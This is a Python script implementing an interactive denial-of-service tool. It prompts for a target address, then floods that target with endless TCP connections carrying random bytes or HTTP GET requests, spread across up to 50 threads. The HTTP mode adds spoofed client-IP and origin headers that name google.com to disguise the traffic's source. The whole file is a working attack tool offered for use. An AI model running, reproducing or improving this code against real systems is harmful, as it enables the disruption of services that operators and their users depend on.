import socket
from os import urandom, path
class DOSTarget:
    addr = ""
    Type = ""
    port = 0
    ip_version = 0
    generated_data = None
    threads = 0
    protocol_info = [None, None]
    spoof_target = "google.com"
    packet_size = 0
    def __init__(self):
        self.addr = input("Enter the target-an IP address or domain name-of the DOS attack: ")
        self.Type = input("Do you want to flood the target with HTTP GET requests or socket connections (if you're not sure, type http. The valid inputs are 'http' and 'socket')? ")
        if self.Type != "http" and self.Type != "socket":
            raise ValueError("you must enter 'http' or 'socket'")
        if self.Type == "socket":
            try:
                self.ip_version = int(input("Is {} an IPV4 or an IPV6 address (type 4 or 6, representing IPV4 or IPV6): ".format(self.addr)))
            except Exception:
                raise TypeError("you must enter the digit 4 or the digit 6")
            if self.ip_version != 4 and self.ip_version != 6:
                raise ValueError("you must enter the digit 4 or the digit 6")
        else:
            self.ip_version = 0
        if self.Type == "socket":
            try:
                self.port = int(input("Please enter the port for the DOS attack-if you're not sure, type 80: "))
            except Exception:
                raise TypeError("you must enter a number less than or equal to 65535")
            if self.port > 65535:
                raise ValueError("you must enter a number less than or equal to 65535")
        else:
            self.port = 80
        if self.Type == "http":
            err = False
            if not self.addr.startswith("http://"):
                if not self.addr.startswith("https://"):
                    err = True
            if err == True:
                if "//" in self.addr:
                    raise ValueError("the address {} uses an unsupported protocol for an HTTP GET request. Use socket connections for addresses that do not use http:// or https://".format(self.addr))
                else:
                    raise ValueError("you must include the web protocol (such as http:// or https://) in the target address")
            else:
                if self.addr.startswith("http://"):
                    self.protocol_info[0] = "http"
                    self.protocol_info[1] = 80
                else:
                    self.protocol_info[0] = "https"
                    self.protocol_info[1] = 443
        if self.Type == "socket":
            try:
                self.packet_size = int(input("How many bytes should the packets that are sent be (the larger the packets, the more data the website recieves, but the slower the attack runs-if you're not sure, type 64. The minimum is 10 and the maximum is 256): "))
            except Exception:
                raise TypeError("you must enter a number greater than or equal to 10 and less than or equal to 256")
            if self.packet_size < 10 or self.packet_size > 256:
                raise ValueError("you must enter a number greater than or equal to 10 and less than or equal to 256")
        else:
            self.packet_size = 0
        try:
            self.threads = int(input("How many attacks do you want to be running at the same time? The more attacks, the more powerful the attack is, but lots of attacks at once uses up lots of CPU (the max is 50, and the minimum is 1. If you're not sure, type 2): "))
        except Exception:
            raise TypeError("you must enter a number less than or equal to 50 and greater than 0")
        if self.threads < 1:
            raise ValueError("you must enter a number less than or equal to 50 and greater than 0")
        elif self.threads > 50:
            raise ValueError("you must enter a number less than or equal to 50 and greater than 0")
        self.generated_data = urandom(self.packet_size)
    def attack(self):
        if self.Type == "socket":
            if self.ip_version == 4:
                while True:
                    ipv4_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    ipv4_socket.connect((self.addr, self.port))
                    ipv4_socket.sendall(self.generated_data)
            else:
                while True:
                    ipv6_socket = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
                    ipv6_socket.connect((self.addr, self.port, 0, 0))
                    ipv6_socket.sendall(self.generated_data)
        else:
            while True:
                from requests import get
                full_addr = "{}:{}".format(self.addr, self.protocol_info[1])
                h = {'X-User-IP': self.spoof_target, 'Origin': self.spoof_target, 'True-Client-IP': self.spoof_target, 'X-Source-IP': self.spoof_target}
                r = get(full_addr, headers=h)
    def multiattack(self):
        from threading import Thread
        for i in range(0, self.threads):
            t = Thread(target=self.attack)
            t.start()
